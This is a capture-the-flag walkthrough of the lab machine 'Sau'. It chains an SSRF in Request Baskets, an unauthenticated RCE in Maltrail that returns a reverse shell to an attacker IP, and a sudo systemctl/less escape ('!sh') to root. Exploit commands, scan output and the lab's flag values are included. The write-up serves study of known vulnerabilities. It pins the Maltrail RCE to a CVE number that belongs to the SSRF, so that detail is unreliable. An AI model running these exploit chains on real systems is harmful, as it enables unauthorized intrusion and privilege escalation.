#box #SSRF #RCE #GTFOBins  

Sau consists in a box that manifests a SSRF vulnerability on Request Baskets 1.2.1 which is a Go web service to collect HTTP Requests. The web service allows us to forward requests of a basket to a given target internally in the machine. We discover with Nmap the existence of a http service running on port 80 (while request-baskets was running on 55555) and we perform a SSRF from :55555 pointing to :80, discovering the existence of Maltrail, a Malicious Traffic Detection System.
Also Maltrail presents a vulnerability that allows us to perform an Unauthenticated RCE throughout the /login endpoint.
Once in the machine, with `sudo -l` we recognize we have the permission to perform a sudo on the status of a service throughout `systemctl`. By investigating systemd's version, we discover that the specific version presents a vulnerability. Leveraging on that vulnerability, we discover the possibility to perform a privilege escalation, obtaining root access.
## Nmap

We perform a nmap scan, confirming the existence of different open/filtered ports: 22, 80, 8338, 55555.
```bash
# Nmap 7.95 scan initiated Mon Mar 24 23:39:36 2025 as: /usr/lib/nmap/nmap -p22,80,8338,55555 -sC -sV -o nmap_sCsVA 10.129.229.26
Nmap scan report for 10.129.229.26
Host is up (0.045s latency).

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     http    Golang net/http server
| http-title: Request Baskets
|_Requested resource was /web
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Mon, 24 Mar 2025 23:40:13 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Mon, 24 Mar 2025 23:39:56 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Mon, 24 Mar 2025 23:39:57 GMT
|     Content-Length: 0
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.95%I=7%D=3/24%Time=67E1ED4C%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\
SF:x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Mon,\x2024\x20Mar\x20
SF:2025\x2023:39:56\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/w
SF:eb\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x202
SF:00\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Mon,\x2024\x20Mar\x20
SF:2025\x2023:39:57\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Co
SF:ntent-Type-Options:\x20nosniff\r\nDate:\x20Mon,\x2024\x20Mar\x202025\x2
SF:023:40:13\x20GMT\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20n
SF:ame;\x20the\x20name\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\
SF:-_\\\.\]{1,250}\$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(OfficeScan
SF:,A3,"HTTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host
SF:\x20header\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnecti
SF:on:\x20close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Ho
SF:st\x20header");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 24 23:40:22 2025 -- 1 IP address (1 host up) scanned in 46.94 seconds
```
Since 80 and 8338 are filtered, we'll look at 55555 finding Request-Baskets, a web service to collect HTTP Requests
## Request-Baskets

On Request-Baskets, we first trying to understand what we can do and discover we can create Baskets where we'll be able to perform calls on them and collect those requests. By clicking on the Gear button on the top menu we discover a suspicious functionality, **Forward URL**. By looking on Google we discover that Request-Baskets < 1.2.1 is vulnerable to SSRF, therefore we download a PoC (or we can actually configure the basket to redirect the requests) and generate a basket that will point to `http://127.0.0.1:80/` which is the target we wanna reach from outside the network.
To explain the SSRF, it's enough to say that a vulnerable exposed to the internet application, can potentially become the vector that permits the internet to access an internal resource.
Assuming, like in this case, that port :80 can't be accessed from outside, the service on :55555, being vulnerable, acts like a pivot that permits us to access a non reachable point of a network. Due to its nature, SSRF vulnerabilities are highly ranked in the risk matrix.
![[attachments/sau-writeup-1.svg]]

The [exploit](https://github.com/mathias-mrsn/request-baskets-v121-ssrf) generates a basket with the URL forwarding option set to the target we would like to reach from outside, thus it can be performed in the following way:
```python
python3 ./exploit.py http://10.129.229.26:55555 http://127.0.0.1:80/
```

At this point, when accessing http://10.129.229.26:55555/{basketName} we'll be redirected to (externally) http://10.129.229.26:80/ which would not be accessible from the external. However, since this is a forwarding from a port residing on the same network the page will be accessible since it's rendered by an internal network's request.
On http://10.129.229.26:80/ we'll discover the presence of Maltrail, a Malicious Traffic Detection system
## Maltrail

Once accessed Maltrail, we have a clear understanding of its version since it's rendered in plain text on the page, discovering it's **v0.53**. By googling that version online, we discover it suffers an Unauthenticated RCE vulnerability, precisely [CVE-2023-27163](https://github.com/HusenjanDev/CVE-2023-27163-AND-Mailtrail-v0.53).
By leveraging on this vulnerability with the following script, we achieve a reverse shell on the system. The shell is passed encoded in base64 and is then encoded in bash within a command injection. The effective injection can be found [here](https://github.com/HusenjanDev/CVE-2023-27163-AND-Mailtrail-v0.53/blob/93008c14225dac23049676a1b17e164c105db693/exploit.py#L41).
The command used to trigger the PoC is the following, and it recalls a reverse shell since we're effectively passing the arguments required to the revshell to work:
```python
python3 maltrail_0_53_exploit.py 10.10.16.25 1337 http://10.129.229.26:55555/ybyuot
```

Once triggered this exploit, we'll have a shell on the machine.
User: `419c447f371679eb35f484aa3f159c75`
## Systemd

Once on the target machine, the first thing we do is `sudo -l` to understand whether there's any executable we have administrator rights on, and we discover that we have `/usr/bin/systemctl status trail.service` that we can execute as sudo.
By looking at the version of `systemd` with `systemd -v` we discover that the version of systemd is `systemd 245 (245.4-4ubuntu3.22)`. By looking online, we discover that this version is vulnerable to a Living Off the Land that permits to perform a privilege escalation throughout the less reader. 

We can perform privilege escalation by looking at [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/) or by searching [CVE-2023-26604](https://sploitus.com/exploit?id=EDB-ID:51674) and using:
```bash
/usr/bin/systemctl status trail.service
```
This command will enter us in the less reader for this service, and once there we can do: `!sh` to effectively escape the reader and escalate to root.

Root: `c8773942bec35ad8271372d3a7610907`
